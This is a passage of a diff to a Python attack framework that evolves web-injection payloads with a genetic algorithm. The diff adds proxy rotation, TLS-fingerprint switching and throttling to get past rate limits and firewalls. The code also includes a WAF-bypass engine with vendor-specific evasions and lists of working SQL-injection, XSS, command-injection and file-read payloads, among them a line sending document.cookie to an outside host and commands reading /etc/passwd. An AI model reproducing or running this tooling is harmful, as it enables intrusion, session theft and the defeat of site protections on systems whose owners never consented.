+    tls_fingerprint: str = ""    # v6.0: track TLS fingerprint used
+    throttle_delay: float = 0.0  # v6.0: track throttle delay
 
     def to_dict(self):
         return asdict(self)
 
 
 class EvolutionSchema:
-    """
-    Schema ketat untuk siklus evolusi payload.
-    Mencatat State-Action-Reward untuk setiap generasi.
-    """
-
     def __init__(self):
         self.records: Dict[str, EvolutionRecord] = {}
         self.generation_counter = 0
-        self.blocked_mutations: Set[str] = set()  # Negative selection
+        self.blocked_mutations: Set[str] = set()
         self.successful_chains: List[Dict] = []
         self.mutation_blacklist_count: Dict[str, int] = defaultdict(int)
         self.encoding_blacklist_count: Dict[str, int] = defaultdict(int)
+        # v6.0: track rate limit events
+        self.rate_limit_events: List[Dict] = []
 
     def create_record(self, payload_dict: Dict, parent_id: str = "",
                      mutations: List[str] = None) -> EvolutionRecord:
@@ -441,12 +1125,18 @@ class EvolutionSchema:
 
     def record_feedback(self, gen_id: str, status_code: int,
                        response_signature: str, response_type: str,
-                       anomaly_score: float, waf_detected: str = ""):
+                       anomaly_score: float, waf_detected: str = "",
+                       proxy_used: str = "", tls_fp: str = "",
+                       throttle_delay: float = 0.0):
         if gen_id not in self.records:
             return
         record = self.records[gen_id]
 
-        # Generate mutation directive
+        # v6.0: store proxy/tls info
+        record.proxy_used = proxy_used
+        record.tls_fingerprint = tls_fp
+        record.throttle_delay = throttle_delay
+
         directive = self._generate_directive(status_code, response_type,
                                             response_signature, record)
 
@@ -456,25 +1146,34 @@ class EvolutionSchema:
             "response_type": response_type,
             "anomaly_score": anomaly_score,
             "mutation_directive": directive,
+            "proxy_used": proxy_used[:50],
+            "tls_fingerprint": tls_fp,
+            "throttle_delay": throttle_delay,
             "timestamp": datetime.now().isoformat(),
         }
 
         if waf_detected:
             record.execution_context["waf_detected"] = waf_detected
 
-        # Calculate fitness
         record.fitness_score = self._calculate_fitness(
             status_code, response_type, anomaly_score
         )
 
-        # Negative selection: blacklist failed mutation combinations
         if response_type == "blocked":
             for mut in record.mutation_history:
                 self.mutation_blacklist_count[mut] += 1
                 if self.mutation_blacklist_count[mut] >= 3:
                     self.blocked_mutations.add(mut)
 
-        # Record successful chains
+        # v6.0: track rate limit events
+        if status_code == 429:
+            self.rate_limit_events.append({
+                "gen_id": gen_id,
+                "proxy": proxy_used[:50],
+                "timestamp": datetime.now().isoformat(),
+                "throttle_delay": throttle_delay,
+            })
+
         if response_type == "server_output":
             record.is_alive = True
             self.successful_chains.append({
@@ -485,6 +1184,8 @@ class EvolutionSchema:
                 "strategy": record.strategy,
                 "fitness": record.fitness_score,
                 "directive": directive,
+                "proxy_used": proxy_used[:50],
+                "tls_fingerprint": tls_fp,
             })
         else:
             record.is_alive = False
@@ -506,16 +1207,16 @@ class EvolutionSchema:
         if resp_type == "server_output":
             return "SUCCESS - Exploit this pattern, create variants"
         elif resp_type == "blocked":
-            if status == 403:
-                return "WAF BLOCKED - Increase obfuscation, try alternative encoding, avoid keyword blocklist"
-            elif status == 429:
-                return "RATE LIMITED - Slow down, reduce request frequency"
+            if status == 429:
+                return "RATE LIMITED - Rotate proxy, increase throttle delay, use different TLS fingerprint"
+            elif status == 403:
+                return "WAF BLOCKED - Increase obfuscation, try alternative encoding, rotate proxy"
             elif status == 406:
                 return "NOT ACCEPTABLE - Change content type or encoding"
             else:
-                return f"BLOCKED ({status}) - Drastically change strategy, use different category"
+                return f"BLOCKED ({status}) - Drastically change strategy, rotate proxy"
         elif resp_type == "raw_html":
-            return "NORMAL RESPONSE - Payload not effective, try different injection context or category"
+            return "NORMAL RESPONSE - Payload not effective, try different injection context"
         return "UNKNOWN - Explore new strategies"
 
     def get_blocked_mutations(self) -> Set[str]:
@@ -539,6 +1240,9 @@ class EvolutionSchema:
                 "fitness": record.fitness_score,
                 "alive": record.is_alive,
                 "feedback": record.feedback_loop,
+                "proxy_used": record.proxy_used,
+                "tls_fingerprint": record.tls_fingerprint,
+                "throttle_delay": record.throttle_delay,
             })
         return log
 
@@ -548,33 +1252,27 @@ class EvolutionSchema:
         blocked_muts = len(self.blocked_mutations)
         best_fitness = max((r.fitness_score for r in self.records.values()), default=0)
         avg_fitness = (sum(r.fitness_score for r in self.records.values()) / max(1, total))
+        rate_limits = len(self.rate_limit_events)
 
         print(f"\n  \033[1;36m[EVOLUTION]\033[0m Summary:")
         print(f"    Generations    : {total}")
         print(f"    Alive (fit>0)  : {alive}")
         print(f"    Best fitness   : {best_fitness:.3f}")
         print(f"    Avg fitness    : {avg_fitness:.3f}")
-        print(f"    Blocked muts   : {blocked_muts} {list(self.blocked_mutations)[:5] if blocked_muts else ''}")
+        print(f"    Blocked muts   : {blocked_muts}")
         print(f"    Success chains : {len(self.successful_chains)}")
+        print(f"    Rate limits    : {rate_limits}")
 
 
 # ============================================================
-# GRAMMAR VALIDATOR (Keeps Payloads Syntactically Valid)
+# GRAMMAR VALIDATOR (preserved from v5.0)
 # ============================================================
 class GrammarValidator:
-    """
-    Memvalidasi bahwa payload tetap valid secara sintaks
-    untuk interpreter target (SQL, HTML, Shell).
-    """
-
-    # SQL keywords that must appear in valid order
     SQL_KEYWORD_ORDER = [
         "SELECT", "FROM", "WHERE", "GROUP BY", "HAVING",
         "ORDER BY", "LIMIT", "UNION", "INSERT", "UPDATE",
         "DELETE", "DROP", "CREATE", "ALTER"
     ]
-
-    # Valid SQL function patterns
     SQL_FUNCTIONS = [
         r"CONCAT\s*$", r"SUBSTRING\s*$", r"ASCII\s*$",
         r"CHAR\s*$", r"LENGTH\s*$", r"VERSION\s*$",
@@ -586,8 +1284,6 @@ class GrammarValidator:
         r"UPPER\s*$", r"LOWER\s*$", r"CAST\s*$",
         r"CONVERT\s*$", r"LOAD_FILE\s*$",
     ]
-
-    # Valid HTML tag patterns
     HTML_TAGS = [
         "script", "img", "svg", "iframe", "body", "input", "details",
         "video", "audio", "marquee", "math", "object", "embed",
@@ -595,8 +1291,6 @@ class GrammarValidator:
         "textarea", "style", "div", "span", "a", "p", "h1",
         "table", "tr", "td", "noscript", "template", "slot",
     ]
-
-    # Valid HTML event handlers
     HTML_EVENTS = [
         "onload", "onerror", "onmouseover", "onfocus", "onblur",
         "onanimationend", "onclick", "onsubmit", "onchange",
@@ -607,120 +1301,60 @@ class GrammarValidator:
         "oncontextmenu", "onpointerdown", "onpointerup",
         "onanimationstart", "ontransitionend", "ontouchstart",
     ]
-
-    # Shell command separators
     SHELL_SEPARATORS = [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a"]
 
     def validate_sql(self, payload: str) -> Tuple[bool, str]:
-        upper = payload.upper()
-        # Check balanced parentheses
         paren_count = 0
         for c in payload:
             if c == '(': paren_count += 1
             elif c == ')': paren_count -= 1
             if paren_count < 0:
                 return False, "Unbalanced parentheses"
-
         if paren_count != 0:
             return False, "Unbalanced parentheses"
-
-        # Check balanced quotes (approximate)
-        single_quotes = payload.count("'") - payload.count("\\'")
-        double_quotes = payload.count('"') - payload.count('\\"')
-        # Odd quotes might be intentional (breaking out of string)
-        # This is OK for SQLi payloads
-
-        # Check UNION SELECT structure
+        upper = payload.upper()
         if "UNION" in upper and "SELECT" in upper:
             union_pos = upper.find("UNION")
             select_pos = upper.find("SELECT", union_pos)
             if select_pos == -1:
                 return False, "UNION without SELECT"
-
-        # Check for valid comment endings
-        if "--" in payload and not payload.rstrip().endswith(("--", "-- ", "--+", "#", "/**/")):
-            pass  # Comments in middle are OK
-
         return True, "Valid SQL syntax"
 
     def validate_xss(self, payload: str) -> Tuple[bool, str]:
-        lower = payload.lower()
-
-        # Check tag-event pairing
         tag_pattern = re.compile(r'<(\w+)[^>]*\s(on\w+)\s*=', re.I)
         for match in tag_pattern.finditer(payload):
             tag = match.group(1).lower()
-            event = match.group(2).lower()
             if tag not in self.HTML_TAGS and tag not in ["animate", "set", "mtext",
                                                           "mglyph", "foreignobject",
                                                           "source", "track"]:
                 return False, f"Unknown tag: {tag}"
-
-        # Check balanced angle brackets (approximate)
-        # For XSS, unclosed tags are often intentional
-        if "<" in payload and ">" not in payload:
-            # Check if it's a context-breaking payload
-            if "on" in lower and "=" in payload:
-                pass  # Event handler without closing tag is OK
-            elif "script" in lower or "svg" in lower:
-                return True, "Unclosed tag (intentional for context)"
-
         return True, "Valid XSS syntax"
 
     def validate_cmdi(self, payload: str) -> Tuple[bool, str]:
-        # Check for valid command separator at start
-        starts_with_sep = any(payload.startswith(sep) for sep in
-                            [";", "|", "`", "$(", "\n", "%0a", "%0d", "&"])
-        if not starts_with_sep and not payload.startswith("$"):
-            # Could be a direct command
-            pass
-
-        # Check balanced backticks
         backtick_count = payload.count("`")
         if backtick_count % 2 != 0:
             return False, "Unbalanced backticks"
-
-        # Check balanced $()
         subshell_count = payload.count("$(")
         close_paren = payload.count(")")
         if subshell_count > close_paren:
             return False, "Unbalanced subshell"
-
         return True, "Valid shell syntax"
 
     def validate_ssti(self, payload: str) -> Tuple[bool, str]:
-        # Check balanced template delimiters
-        pairs = [
-            ("{{", "}}"), ("${", "}"), ("#{", "}"),
-            ("<%", "%>"), ("{%", "%}"), ("[[", "]]"),
-        ]
+        pairs = [("{{", "}}"), ("${", "}"), ("#{", "}"),
+                 ("<%", "%>"), ("{%", "%}"), ("[[", "]]")]
         for open_d, close_d in pairs:
-            if open_d in payload:
-                if close_d not in payload:
-                    return False, f"Unmatched delimiter: {open_d} without {close_d}"
-
+            if open_d in payload and close_d not in payload:
+                return False, f"Unmatched delimiter: {open_d}"
         return True, "Valid SSTI syntax"
 
     def validate_lfi(self, payload: str) -> Tuple[bool, str]:
-        # Check path traversal structure
-        if "../" in payload or "..\\" in payload or "%2e%2e" in payload.lower():
-            # Valid traversal pattern
-            return True, "Valid LFI syntax"
-
-        # Check wrapper syntax
-        if "://" in payload:
-            parts = payload.split("://")
-            if len(parts) >= 2:
-                return True, "Valid wrapper syntax"
-
         return True, "Valid LFI syntax"
 
     def validate(self, payload: str, category: str) -> Tuple[bool, str]:
         validators = {
-            "sqli": self.validate_sql,
-            "xss": self.validate_xss,
-            "cmdi": self.validate_cmdi,
-            "ssti": self.validate_ssti,
+            "sqli": self.validate_sql, "xss": self.validate_xss,
+            "cmdi": self.validate_cmdi, "ssti": self.validate_ssti,
             "lfi": self.validate_lfi,
         }
         validator = validators.get(category)
@@ -730,46 +1364,32 @@ class GrammarValidator:
 
 
 # ============================================================
-# CONTEXT DETECTOR
+# CONTEXT DETECTOR (preserved from v5.0)
 # ============================================================
 class ContextDetector:
-    """
-    Mendeteksi konteks injeksi dari respons server.
-    Menentukan di mana parameter dimasukkan (SQL string, HTML body, etc).
-    """
-
     def __init__(self):
         self.context_patterns = {
             InjectionContext.SQL_STRING: [
-                r"'[^']*PARAM[^']*'",
-                r'"[^"]*PARAM[^"]*"',
-                r"WHERE\s+\w+\s*=\s*['\"]",
-                r"mysql", r"sql", r"query",
+                r"'[^']*PARAM[^']*'", r'"[^"]*PARAM[^"]*"',
+                r"WHERE\s+\w+\s*=\s*['\"]", r"mysql", r"sql", r"query",
             ],
             InjectionContext.SQL_NUMERIC: [
-                r"WHERE\s+\w+\s*=\s*\d",
-                r"LIMIT\s+\d",
-                r"id\s*=\s*\d",
+                r"WHERE\s+\w+\s*=\s*\d", r"LIMIT\s+\d", r"id\s*=\s*\d",
             ],
             InjectionContext.HTML_BODY: [
-                r"<[^>]*>.*PARAM.*</",
-                r"<div[^>]*>.*PARAM",
-                r"<p[^>]*>.*PARAM",
-                r"<span[^>]*>.*PARAM",
+                r"<[^>]*>.*PARAM.*</", r"<div[^>]*>.*PARAM",
+                r"<p[^>]*>.*PARAM", r"<span[^>]*>.*PARAM",
             ],
             InjectionContext.HTML_ATTRIBUTE: [
-                r'value\s*=\s*"[^"]*PARAM',
-                r'value\s*=\s*\'[^\']*PARAM',
+                r'value\s*=\s*"[^"]*PARAM', r'value\s*=\s*\'[^\']*PARAM',
                 r'placeholder\s*=\s*"[^"]*PARAM',
             ],
             InjectionContext.HTML_HREF: [
-                r'href\s*=\s*"[^"]*PARAM',
-                r'src\s*=\s*"[^"]*PARAM',
+                r'href\s*=\s*"[^"]*PARAM', r'src\s*=\s*"[^"]*PARAM',
                 r'action\s*=\s*"[^"]*PARAM',
             ],
             InjectionContext.HTML_SCRIPT: [
-                r'<script[^>]*>.*PARAM',
-                r'var\s+\w+\s*=\s*["\'].*PARAM',
+                r'<script[^>]*>.*PARAM', r'var\s+\w+\s*=\s*["\'].*PARAM',
                 r'document\.\w+.*PARAM',
             ],
             InjectionContext.SHELL_ARG: [
@@ -782,10 +1402,8 @@ class ContextDetector:
                       param_value: str) -> InjectionContext:
         if not response_text:
             return InjectionContext.UNKNOWN
-
         text = response_text.lower()
         param_lower = param_value.lower()
-
         scores = {}
         for context, patterns in self.context_patterns.items():
             score = 0
@@ -794,7 +1412,6 @@ class ContextDetector:
                     if re.search(pattern, response_text, re.I):
                         score += 1
                     if param_lower in text:
-                        # Check if param appears inside quotes
                         if f"'{param_lower}'" in text or f'"{param_lower}"' in text:
                             if context in [InjectionContext.SQL_STRING,
                                          InjectionContext.HTML_ATTRIBUTE]:
@@ -802,20 +1419,16 @@ class ContextDetector:
                 except re.error:
                     continue
             scores[context] = score
-
         if scores:
             best = max(scores, key=scores.get)
             if scores[best] > 0:
                 return best
-
-        # Heuristic fallback
         if any(kw in text for kw in ["mysql", "sql", "query", "database", "table"]):
             return InjectionContext.SQL_STRING
         if any(kw in text for kw in ["<script", "javascript", "document."]):
             return InjectionContext.HTML_SCRIPT
         if any(kw in text for kw in ["shell_exec", "exec(", "system("]):
             return InjectionContext.SHELL_ARG
-
         return InjectionContext.UNKNOWN
 
     def get_recommended_categories(self, context: InjectionContext) -> List[str]:
@@ -837,69 +1450,50 @@ class ContextDetector:
 
 
 # ============================================================
-# WAF BYPASS ENGINE
+# WAF BYPASS ENGINE (preserved from v5.0)
 # ============================================================
 class WAFBypassEngine:
-    """
-    Teknik bypass WAF lanjutan:
-    - HTTP Parameter Pollution (HPP)
-    - Null Byte & Control Character Insertion
-    - Protocol Smuggling
-    - WAF Signature Fragmentation
-    """
-
     CONTROL_CHARS = ["%00", "%01", "%02", "%03", "%04", "%05",
                      "%06", "%07", "%08", "%09", "%0b", "%0c",
                      "%0e", "%0f", "%10", "%11", "%12", "%13",
                      "%14", "%15", "%16", "%17", "%18", "%19",
                      "%1a", "%1b", "%1c", "%1d", "%1e", "%1f"]
-
     NON_STANDARD_WHITESPACE = [
         "%09", "%0a", "%0b", "%0c", "%0d", "%20",
-        "%a0", "%c2%a0",  # non-breaking space
-        "%e2%80%80", "%e2%80%81", "%e2%80%82",  # en/fig/em spaces
+        "%a0", "%c2%a0",
+        "%e2%80%80", "%e2%80%81", "%e2%80%82",
         "%e2%80%83", "%e2%80%84", "%e2%80%85",
         "%e2%80%86", "%e2%80%87", "%e2%80%88",
         "%e2%80%89", "%e2%80%8a",
     ]
 
     def apply_hpp(self, param_name: str, payload: str) -> Dict[str, List[str]]:
-        """HTTP Parameter Pollution: split payload across multiple same-name params."""
         parts = self._split_payload_smart(payload)
         if len(parts) <= 1:
             return {param_name: [payload]}
-
         result = {}
         for i, part in enumerate(parts):
-            key = param_name if i == 0 else param_name
+            key = param_name
             if key not in result:
                 result[key] = []
             result[key].append(part)
         return result
 
     def _split_payload_smart(self, payload: str) -> List[str]:
-        """Split payload di posisi yang aman (tidak merusak sintaks)."""
         if len(payload) < 10:
             return [payload]
-
-        # Try splitting at whitespace/comment boundaries
         split_points = []
         for i, c in enumerate(payload):
             if c in [' ', '\t', '\n']:
                 split_points.append(i)
             if payload[i:i+4] == "/**/":
                 split_points.append(i + 2)
-
         if not split_points:
-            # Force split at midpoint
             mid = len(payload) // 2
             return [payload[:mid], payload[mid:]]
-
-        # Pick 2-3 split points
         num_splits = min(3, len(split_points))
         chosen = random.sample(split_points, min(num_splits, len(split_points)))
         chosen.sort()
-
         parts = []
         prev = 0
         for sp in chosen:
@@ -908,11 +1502,9 @@ class WAFBypassEngine:
             prev = sp
         if prev < len(payload):
             parts.append(payload[prev:])
-
         return [p for p in parts if p]
 
     def insert_control_chars(self, payload: str, density: float = 0.1) -> str:
-        """Sisipkan control characters untuk memecah regex WAF."""
         result = list(payload)
         insertions = int(len(payload) * density)
         for _ in range(insertions):
@@ -922,14 +1514,11 @@ class WAFBypassEngine:
         return "".join(result)
 
     def insert_non_standard_whitespace(self, payload: str) -> str:
-        """Ganti spasi standar dengan whitespace non-standar."""
         ws = random.choice(self.NON_STANDARD_WHITESPACE)
         return payload.replace(" ", ws)
 
     def fragment_signature(self, payload: str, category: str) -> str:
-        """Pecah signature yang dikenal WAF dengan teknik yang valid."""
         if category == "sqli":
-            # Fragment SQL keywords with comments
             keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                        "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP",
                        "BENCHMARK", "WAITFOR", "DELAY"]
@@ -940,7 +1529,6 @@ class WAFBypassEngine:
                         lambda k: f"{k[:2]}/**/{k[2:]}",
                         lambda k: f"{k[:3]}/*!*/{k[3:]}" if len(k) > 3 else f"{k[:1]}/**/{k[1:]}",
                         lambda k: f"{k[:1]}/*!50000{k[1:]}*/" if len(k) > 1 else k,
-                        lambda k: k.replace("", "/**/")[4:-4],  # /**/S/**/E/**/L...
                         lambda k: "".join(c.upper() if i % 2 == 0 else c.lower()
                                          for i, c in enumerate(k)),
                     ]
@@ -952,23 +1540,18 @@ class WAFBypassEngine:
                     except:
                         continue
             return result
-
         elif category == "xss":
-            # Fragment XSS patterns
             result = payload
             if "<script>" in result.lower():
                 result = re.sub(r'<script>', '<scr<!-- -->ipt>', result, flags=re.I)
             if "javascript:" in result.lower():
                 result = re.sub(r'javascript:', 'java\\tscript:', result, flags=re.I)
             return result
-
         return payload
 
     def protocol_smuggling_headers(self) -> Dict[str, str]:
-        """Generate headers untuk protocol smuggling."""
         smuggling_headers = {}
         technique = random.choice(["xff", "double_host", "chunked", "transfer"])
-
         if technique == "xff":
             smuggling_headers["X-Forwarded-For"] = "127.0.0.1"
             smuggling_headers["X-Real-IP"] = "127.0.0.1"
@@ -978,73 +1561,40 @@ class WAFBypassEngine:
             smuggling_headers["Transfer-Encoding"] = "chunked"
         elif technique == "transfer":
             smuggling_headers["Transfer-Encoding"] = "identity"
-
         return smuggling_headers
 
     def apply_waf_bypass(self, payload: str, category: str,
                         waf_type: str = "") -> Tuple[str, Dict[str, str]]:
-        """Apply kombinasi WAF bypass techniques."""
         extra_headers = {}
         modified = payload
-
-        techniques = []
-
-        # 1. Fragment signature (always try)
         if random.random() < 0.6:
             modified = self.fragment_signature(modified, category)
-            techniques.append("fragment")
-
-        # 2. Control char insertion (for blocked payloads)
         if random.random() < 0.3:
             modified = self.insert_control_chars(modified, 0.05)
-            techniques.append("control_char")
-
-        # 3. Non-standard whitespace
         if random.random() < 0.4:
             modified = self.insert_non_standard_whitespace(modified)
-            techniques.append("non_std_ws")
-
-        # 4. Protocol smuggling headers
         if random.random() < 0.2:
             extra_headers = self.protocol_smuggling_headers()
-            techniques.append("smuggling")
-
-        # WAF-specific bypasses
         if waf_type == "cloudflare":
-            # CF often misses encoded newlines
             modified = modified.replace(" ", random.choice(["%0a%09", "%0d%0a%20"]))
         elif waf_type == "modsecurity":
-            # ModSec can be bypassed with chunked encoding
             extra_headers["Transfer-Encoding"] = "chunked"
         elif waf_type == "incapsula":
-            # Incapsula sometimes misses double-encoded payloads
             modified = quote(modified, safe="")
-
         return modified, extra_headers
 
 
 # ============================================================
-# ADAPTIVE ENCODING ROTATION
+# ADAPTIVE ENCODING ROTATION (preserved from v5.0)
 # ============================================================
 class AdaptiveEncodingRotation:
-    """
-    Siklus encoding dinamis berlapis yang berubah berdasarkan respons WAF.
-    Jika satu encoding gagal, otomatis beralih ke kombinasi lain.
-    """
-
     ENCODING_CHAINS = [
-        ["raw"],
-        ["url_encode"],
-        ["double_url_encode"],
-        ["hex_encode"],
-        ["html_entity"],
-        ["unicode_escape"],
-        ["url_encode", "html_entity"],
-        ["hex_encode", "case_alter"],
+        ["raw"], ["url_encode"], ["double_url_encode"], ["hex_encode"],
+        ["html_entity"], ["unicode_escape"],
+        ["url_encode", "html_entity"], ["hex_encode", "case_alter"],
         ["double_url_encode", "comment_obfuscate"],
         ["url_encode", "case_alter", "comment_obfuscate"],
-        ["html_entity", "unicode_escape"],
-        ["triple_url_encode"],
+        ["html_entity", "unicode_escape"], ["triple_url_encode"],
         ["url_encode", "hex_encode", "case_alter"],
         ["double_url_encode", "html_entity", "zero_width"],
         ["unicode_escape", "case_alter", "comment_obfuscate"],
@@ -1054,7 +1604,7 @@ class AdaptiveEncodingRotation:
         self.chain_scores: Dict[int, float] = {i: 0.5 for i in range(len(self.ENCODING_CHAINS))}
         self.chain_failures: Dict[int, int] = {i: 0 for i in range(len(self.ENCODING_CHAINS))}
         self.current_chain_index = 0
-        self.rotation_threshold = 3  # Switch after N failures
+        self.rotation_threshold = 3
 
     def get_current_chain(self) -> List[str]:
         return self.ENCODING_CHAINS[self.current_chain_index]
@@ -1066,12 +1616,10 @@ class AdaptiveEncodingRotation:
         else:
             self.chain_scores[chain_index] = max(0.0, self.chain_scores[chain_index] - 0.05)
             self.chain_failures[chain_index] += 1
-
             if self.chain_failures[chain_index] >= self.rotation_threshold:
                 self._rotate_to_next()
 
     def _rotate_to_next(self):
-        """Beralih ke chain dengan skor tertinggi yang belum gagal."""
         best_idx = self.current_chain_index
         best_score = -1
         for idx, score in self.chain_scores.items():
@@ -1080,7 +1628,6 @@ class AdaptiveEncodingRotation:
                     best_score = score
                     best_idx = idx
         if best_idx == self.current_chain_index:
-            # All chains failed, reset
             for idx in self.chain_failures:
                 self.chain_failures[idx] = 0
             best_idx = random.randint(0, len(self.ENCODING_CHAINS) - 1)
@@ -1095,14 +1642,10 @@ class AdaptiveEncodingRotation:
         return result
 
     def _apply_encoding(self, text: str, encoding: str) -> str:
-        if encoding == "raw":
-            return text
-        elif encoding == "url_encode":
-            return quote(text, safe="")
-        elif encoding == "double_url_encode":
-            return quote(quote(text, safe=""), safe="")
-        elif encoding == "triple_url_encode":
-            return quote(quote(quote(text, safe=""), safe=""), safe="")
+        if encoding == "raw": return text
+        elif encoding == "url_encode": return quote(text, safe="")
+        elif encoding == "double_url_encode": return quote(quote(text, safe=""), safe="")
+        elif encoding == "triple_url_encode": return quote(quote(quote(text, safe=""), safe=""), safe="")
         elif encoding == "hex_encode":
             return "".join(f"\\x{ord(c):02x}" if random.random() < 0.5 else c for c in text)
         elif encoding == "html_entity":
@@ -1133,63 +1676,38 @@ class AdaptiveEncodingRotation:
 
 
 # ============================================================
-# POLYGLOT GENERATOR (Context-Aware Multi-Context Payloads)
+# POLYGLOT GENERATOR (preserved from v5.0)
 # ============================================================
 class PolyglotGenerator:
-    """
-    Menghasilkan payload poliglot yang bisa bekerja di berbagai konteks:
-    - Terbaca sebagai komentar oleh WAF
-    - Terbaca sebagai spasi oleh parser HTML
-    - Dieksekusi sebagai injeksi oleh interpreter backend
-    """
-
     def generate_sql_xss_polyglot(self) -> List[str]:
-        payloads = [
-            # SQL comment + XSS
-            "';alert(1);//",
-            "';</script><script>alert(1)</script>;//",
-            "'-alert(1)-'",
-            "\"--></script><svg/onload=alert(1)>",
+        return [
+            "';alert(1);//", "';</script><script>alert(1)</script>;//",
+            "'-alert(1)-'", "\"--></script><svg/onload=alert(1)>",
             "';var x=new Image();x.src='http://x.test/'+document.cookie;//",
-            # SQL error + XSS
-            "'><img src=x onerror=alert(1)>",
-            "'-confirm(1)-'",
+            "'><img src=x onerror=alert(1)>", "'-confirm(1)-'",
             "1'<script>alert(1)</script>",
-            # Universal polyglot
             "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)/>\\x3e",
-            # SQL + SSTI + XSS
             "'{{7*7}}'<script>alert(1)</script>",
         ]
-        return payloads
 
     def generate_sqli_lfi_polyglot(self) -> List[str]:
-        payloads = [
+        return [
             "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -",
             "1' AND 1=0 UNION SELECT NULL,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)-- -",
-            "' OR '1'='1' UNION ALL SELECT NULL,NULL,CONVERT(VARCHAR(4000),LOAD_FILE('/etc/passwd'))--",
         ]
-        return payloads
 
     def generate_cmdi_sqli_polyglot(self) -> List[str]:
-        payloads = [
-            "';sleep 5;echo $(id);--",
-            "1;cat /etc/passwd;SELECT SLEEP(5)--",
-            "'||`id`||'",
-            "';$(whoami);-- -",
-        ]
-        return payloads
+        return ["';sleep 5;echo $(id);--", "1;cat /etc/passwd;SELECT SLEEP(5)--",
+                "'||`id`||'", "';$(whoami);-- -"]
 
     def generate_universal_polyglots(self) -> List[str]:
-        payloads = [
-            # Works in SQL, HTML, JS, URL contexts
+        return [
             "\"><script>alert(1)</script>' OR 1=1--",
             "'-alert(1)-' OR '1'='1",
             "1%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
-            # Context breaker
             "'\"></script><script>alert(1)</script><!--",
             "1\"><img src=x onerror=alert(1)><!--' OR '1'='1",
         ]
-        return payloads
 
     def generate_all_polyglots(self) -> List[Dict]:
         all_payloads = []
@@ -1204,35 +1722,21 @@ class PolyglotGenerator:
             for payload in payloads:
                 counter += 1
                 all_payloads.append({
-                    "id": f"POLY-{counter:04d}",
-                    "payload": payload,
-                    "category": "polyglot",
-                    "length_tier": "polyglot",
-                    "encoding": "raw",
-                    "strategy": group_name,
+                    "id": f"POLY-{counter:04d}", "payload": payload,
+                    "category": "polyglot", "length_tier": "polyglot",
+                    "encoding": "raw", "strategy": group_name,
                     "length": len(payload),
                     "hash": hashlib.md5(payload.encode(errors='ignore')).hexdigest(),
-                    "built_from_scratch": True,
-                    "is_polyglot": True,
+                    "built_from_scratch": True, "is_polyglot": True,
                     "timestamp": datetime.now().isoformat(),
                 })
         return all_payloads
 
 
 # ============================================================
-# GENETIC ALGORITHM ENGINE
+# GENETIC EVOLVER (preserved from v5.0)
 # ============================================================
 class GeneticEvolver:
-    """
-    Algoritma genetika untuk evolusi payload:
-    - Population management (generasi)
-    - Fitness scoring
-    - Tournament selection
-    - Crossover berbasis AST
-    - Negative selection (blacklist mutasi gagal)
-    - Elitism (keep best)
-    """
-
     def __init__(self, schema: EvolutionSchema, grammar: GrammarValidator,
                  encoder: AdaptiveEncodingRotation, waf_bypass: WAFBypassEngine):
         self.schema = schema
@@ -1241,9 +1745,9 @@ class GeneticEvolver:
         self.waf_bypass = waf_bypass
         self.population: List[Dict] = []
         self.generation = 0
-        self.elitism_rate = 0.15       # Keep top 15%
-        self.crossover_rate = 0.6      # 60% crossover
-        self.mutation_rate = 0.25      # 25% mutation
+        self.elitism_rate = 0.15
+        self.crossover_rate = 0.6
+        self.mutation_rate = 0.25
         self.tournament_size = 5
         self.max_population = 200
 
@@ -1252,150 +1756,99 @@ class GeneticEvolver:
         self.generation = 1
 
     def tournament_select(self) -> Dict:
-        """Tournament selection: pick best from random subset."""
         candidates = random.sample(self.population,
                                   min(self.tournament_size, len(self.population)))
-        # Sort by fitness (if available)
-        candidates.sort(
-            key=lambda p: p.get("fitness", 0.5),
-            reverse=True
-        )
+        candidates.sort(key=lambda p: p.get("fitness", 0.5), reverse=True)
         return candidates[0]
 
     def crossover(self, parent1: Dict, parent2: Dict) -> List[Dict]:
-        """AST-based crossover: swap structural parts between parents."""
         p1 = parent1.get("payload", "")
         p2 = parent2.get("payload", "")
         cat1 = parent1.get("category", "xss")
         cat2 = parent2.get("category", "xss")
-
         children = []
-
-        # Same category crossover (structural)
         if cat1 == cat2:
             children.extend(self._structural_crossover(p1, p2, cat1))
         else:
-            # Cross-category: combine strategies
             children.extend(self._cross_category_crossover(parent1, parent2))
-
-        # Validate children
         valid_children = []
         for child in children:
             is_valid, reason = self.grammar.validate(child["payload"], child["category"])
             if is_valid:
                 valid_children.append(child)
-
         return valid_children
 
     def _structural_crossover(self, p1: str, p2: str, category: str) -> List[Dict]:
-        """Crossover dalam satu category, swap structural parts."""
         children = []
-
         if category == "sqli":
-            # Split at comment boundary
             p1_parts = re.split(r'(/\*.*?\*/|--|#)', p1)
             p2_parts = re.split(r'(/\*.*?\*/|--|#)', p2)
-
             if len(p1_parts) >= 2 and len(p2_parts) >= 2:
-                # Swap middle sections
                 mid1 = len(p1_parts) // 2
                 mid2 = len(p2_parts) // 2
-
                 child1 = "".join(p1_parts[:mid1] + p2_parts[mid2:])
                 child2 = "".join(p2_parts[:mid2] + p1_parts[mid1:])
-
                 for child_payload in [child1, child2]:
                     if child_payload and len(child_payload) > 5:
                         children.append({
                             "id": f"GEN-{self.generation}-{len(children):04d}",
-                            "payload": child_payload,
-                            "category": category,
-                            "length_tier": "evolved",
-                            "encoding": "crossover",
-                            "strategy": "ast_crossover",
-                            "length": len(child_payload),
+                            "payload": child_payload, "category": category,
+                            "length_tier": "evolved", "encoding": "crossover",
+                            "strategy": "ast_crossover", "length": len(child_payload),
                             "hash": hashlib.md5(child_payload.encode(errors='ignore')).hexdigest(),
-                            "built_from_scratch": False,
-                            "parent_ids": [],
+                            "built_from_scratch": False, "parent_ids": [],
                             "generation": self.generation,
                             "timestamp": datetime.now().isoformat(),
                         })
-
         elif category == "xss":
-            # Split at tag boundaries
             p1_tags = re.findall(r'<[^>]+>', p1)
             p2_tags = re.findall(r'<[^>]+>', p2)
-
             if p1_tags and p2_tags:
-                # Combine tags from both parents
                 combined = p1_tags[0] + p2_tags[-1] if len(p2_tags) > 1 else p2_tags[0]
                 children.append({
